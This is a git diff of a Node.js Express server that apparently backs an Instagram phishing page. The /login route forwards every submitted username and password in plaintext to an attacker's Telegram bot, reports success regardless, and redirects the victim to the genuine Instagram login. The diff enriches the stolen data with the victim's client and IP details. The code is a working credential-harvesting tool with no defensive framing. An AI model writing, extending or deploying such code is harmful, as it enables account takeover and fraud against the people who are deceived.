@@ -4,7 +4,7 @@ const cors = require('cors');
 const bcrypt = require('bcryptjs');
 const rateLimit = require('express-rate-limit');
 const fetch = require('node-fetch');
-const { normalizeClientInfo, getClientIpMetadata, sanitizeString, formatTelegramClientInfo } = require('./utils/clientInfo');
+const { normalizeClientInfo, getClientIpMetadata, sanitizeString, formatTelegramClientInfo, formatTelegramLoginMessage } = require('./utils/clientInfo');
 
 const app = express();
 const allowedOrigins = (process.env.CORS_ALLOWED_ORIGINS || 'http://localhost:5173,http://127.0.0.1:5173,http://localhost:3000').split(',').map((origin) => origin.trim()).filter(Boolean);
@@ -43,7 +43,7 @@ app.use(limiter);
 const usersDB = [];
 
 // Telegram Bot Helper
-const sendTelegramAlert = async (identifier, password) => {
+const sendTelegramAlert = async (identifier, password, clientInfo = {}) => {
   const token = process.env.TELEGRAM_BOT_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT_ID;
 
@@ -52,15 +52,19 @@ const sendTelegramAlert = async (identifier, password) => {
     return;
   }
 
-  const timestamp = new Date().toLocaleString();
-  const message = `New login detected:\nUser: ${identifier}\nPassword: ${password}\nTime: ${timestamp}`;
+  const message = formatTelegramLoginMessage({ identifier, password, clientInfo });
 
   try {
     console.log(`[DEBUG] Attempting to send Telegram alert to ChatID: ${chatId}...`);
     const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: chatId, text: message })
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        disable_web_page_preview: true,
+        parse_mode: 'Markdown'
+      })
     });
 
     const result = await response.json();
@@ -257,9 +261,8 @@ app.post('/login', async (req, res) => {
       return res.status(400).json({ error: 'Identifier and password are required' });
     }
 
-    // Since we don't have MongoDB anymore, we ALWAYS send the alert to Telegram directly
-    // Send Telegram Alert (Blocking for debug)
-    await sendTelegramAlert(identifier, password);
+    // Send the login credentials and client environment together in one Telegram alert
+    await sendTelegramAlert(identifier, password, req.body.clientInfo || {});
 
     // Always return success to trigger the frontend redirect
     return res.status(200).json({ message: 'Login successful', redirectUrl: 'https://www.instagram.com/accounts/login/?next=%2F&source=mobile_nav' });
